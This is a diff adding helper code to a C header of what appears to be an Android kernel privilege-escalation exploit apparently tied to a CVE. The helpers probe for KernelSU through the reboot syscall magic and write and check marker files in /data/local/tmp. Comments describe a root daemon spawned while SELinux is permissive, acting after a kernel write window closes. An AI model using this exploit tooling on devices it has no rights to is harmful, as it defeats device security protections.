@@ -476,4 +476,117 @@ int run_p0_pipe_oracle_diagnostic(int fd);
 
 int install_android_root(int fd);
 
+/*
+ * Pre-exploit KernelSU liveness probe.
+ *
+ * KernelSU hooks sys_reboot with the 0xDEADBEEF/0xCAFEBABE magic pair and
+ * hands back an fd to its control device. Without the module loaded the
+ * kernel rejects the unknown reboot magic with EINVAL and never reboots, so
+ * the probe is safe on stock kernels. Returns 1 when the module is already
+ * responding, 0 otherwise.
+ */
+struct ksu_get_info_cmd {
+  uint32_t version;
+  uint32_t flags;
+  uint32_t features;
+  uint32_t uapi_version;
+};
+
+static inline int ksu_already_active(void) {
+  int fd = -1;
+  syscall(SYS_reboot, 0xDEADBEEF, 0xCAFEBABE, 0, &fd);
+  if (fd < 0) {
+    return 0;
+  }
+  struct ksu_get_info_cmd info;
+  memset(&info, 0, sizeof(info));
+  int ret = ioctl(fd, _IOR('K', 2, struct ksu_get_info_cmd), &info);
+  close(fd);
+  return ret == 0 && info.version != 0;
+}
+
+/*
+ * Boot-scoped activation marker. After a successful activation the root
+ * daemon writes the current boot_id here. The pre-exploit check compares it
+ * against the live boot_id (world-readable) to detect that KernelSU was
+ * already activated this boot. This is the reliable unprivileged detector:
+ * the reboot-syscall probe above requires CAP_SYS_BOOT and returns EPERM
+ * from the shell/app domain even when the module is loaded, so it cannot be
+ * trusted on its own before privilege escalation.
+ */
+#define KSU_ACTIVE_MARKER_PATH "/data/local/tmp/.cve43499-ksu-active"
+
+static inline int read_boot_id(char *out, size_t out_len) {
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t got = read(fd, out, out_len - 1);
+  close(fd);
+  if (got <= 0) {
+    return 0;
+  }
+  out[got] = '\0';
+  while (got > 0 && (out[got - 1] == '\n' || out[got - 1] == '\r')) {
+    out[--got] = '\0';
+  }
+  return got > 0;
+}
+
+static inline int ksu_active_this_boot(void) {
+  char live_boot_id[64];
+  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
+    return 0;
+  }
+  int fd = open(KSU_ACTIVE_MARKER_PATH, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  char marker_boot_id[64];
+  ssize_t got = read(fd, marker_boot_id, sizeof(marker_boot_id) - 1);
+  close(fd);
+  if (got <= 0) {
+    return 0;
+  }
+  marker_boot_id[got] = '\0';
+  while (got > 0 &&
+         (marker_boot_id[got - 1] == '\n' || marker_boot_id[got - 1] == '\r')) {
+    marker_boot_id[--got] = '\0';
+  }
+  return strcmp(live_boot_id, marker_boot_id) == 0;
+}
+
+static inline void ksu_mark_active_this_boot(void) {
+  char live_boot_id[64];
+  if (!read_boot_id(live_boot_id, sizeof(live_boot_id))) {
+    return;
+  }
+  int fd = open(KSU_ACTIVE_MARKER_PATH,
+                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+  if (fd < 0) {
+    return;
+  }
+  ssize_t ignored = write(fd, live_boot_id, strlen(live_boot_id));
+  (void)ignored;
+  close(fd);
+}
+
+/*
+ * Activation handoff: the exploit side (runner or preload supervisor) drops
+ * this marker once the kernel write window is closed. The root daemon, which
+ * was spawned by UMH while SELinux is still permissive, polls for it and
+ * performs KernelSU late-load + module activation from its own context.
+ * This avoids depending on the daemon socket, which becomes unreachable for
+ * shell-domain clients once SELinux re-enforces.
+ */
+#define KSU_ACTIVATE_SIGNAL_PATH "/data/local/tmp/.cve43499-activate"
+
+static inline void ksu_signal_activation(void) {
+  unlink(KSU_ACTIVATE_SIGNAL_PATH);
+  int fd = open(KSU_ACTIVATE_SIGNAL_PATH, O_WRONLY | O_CREAT | O_EXCL, 0644);
+  if (fd >= 0) {
+    close(fd);
+  }
+}
+
 #endif
